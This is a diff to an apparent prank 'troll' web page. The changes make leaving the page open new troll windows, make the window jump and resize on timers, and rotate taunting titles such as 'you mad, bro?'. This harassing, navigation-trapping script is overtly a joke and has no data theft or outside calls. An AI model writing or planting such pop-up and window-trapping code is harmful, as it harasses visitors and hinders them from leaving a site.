@@ -17,13 +17,14 @@ video {
 	}
 		</style>
 	<script>
-		// made by inon13. https://bit.ly/inon13-maib-web
+		// made by inon13. https://bit.ly/inon13-maib-web \\
 	const titleTag = document.getElementById ('titleTag');
 			
-	function windowtroll() {window.open('troll.html', Math.random(), 'parent')};
-		function random(maxnum) {
-			return (Math.floor ((Math.random()) * maxnum))
-		};
+	function random(maxnum) {
+		return (Math.floor ((Math.random()) * maxnum))
+	};
+	
+	function windowtroll() {window.open('troll.html', random(99999999999999), 'parent')};
 
 		window.onkeydown = function() {
 			var keyCode = event.keyCode;
@@ -39,12 +40,7 @@ video {
 		};
 		
 		window.onbeforeunload = function() {
-            return false;
-			if (random(1) == 1) {
-			alert ('problem?');
-			}
-			else if (randoom(1) == 0) {
-			alert ('you mad, bro?')
+			windowtroll();
 		}
 		};
 		
@@ -53,15 +49,14 @@ video {
             if (random(400) > 50 & random(400) < 101) {titleTag.innerHTML = 'you mad, bro?'}
             if (random(400) > 100 & random(400) < 151) {titleTag.innerHTML = "you've been trolled"}
             if (random(400) > 150 & random(400) < 201) {titleTag.innerHTML = 'have a nice day!!'}
-            if (random(400) > 200 & random(400) < 251) {titleTag.innerHTML = 'problem?'}
-            if (random(400) > 250 & random(400) < 301) {titleTag.innerHTML = 'you mad, bro?'}
-            if (random(400) > 300 & random(400) < 351) {titleTag.innerHTML = "you've been trolled"}
-            if (random(400) > 350 & random(400) < 401) {titleTag.innerHTML = 'have a nice day'}
+            if (random(400) > 200 & random(400) < 251) {titleTag.innerHTML = 'trololololo'}
+            if (random(400) > 250 & random(400) < 301) {titleTag.innerHTML = 'troll face'}
+            if (random(400) > 300 & random(400) < 351) {titleTag.innerHTML = "you mad, don't ya?"}
+            if (random(400) > 350 & random(400) < 401) {titleTag.innerHTML = 'LOL'}
         }, 1000);
 
-setInterval(function(){window.moveTo(random(1400), random(1200))});
-		
-		setTimeout (function(){window.resizeTo('400', '400')}, 2500)
+setInterval(function(){window.moveTo(random(1400), random(1200))}, 800);
+		setTimeout (function(){setInterval (function(){window.resizeTo('400', '400')}, 2500)}, 2500)
 	</script>
 	</head>
 	<body>
